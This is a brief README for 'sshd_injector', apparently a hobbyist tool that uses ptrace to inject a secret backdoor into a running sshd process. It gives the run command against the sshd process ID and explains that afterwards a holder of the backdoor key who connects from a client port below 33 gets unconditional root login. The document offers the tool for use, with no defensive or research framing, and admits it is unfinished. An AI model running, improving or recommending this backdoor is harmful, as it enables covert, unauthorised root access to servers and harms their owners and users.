# sshd_injector

A stupid and undone tools to inject some system proc

# What it can do

use ptrace to inject sshd process, leave a secret backdoor in there
but the rx_space could be not enough, I will try fix that

`./build/injector $(pgrep sshd)`

After run that (DO NOT RUN THE INJECTOR TWICE, I will try fix that)
You can use the ./the_backdoor_key the connect
Also you have to use the port less then 33 from your client
And then you can login with root unconditionaly
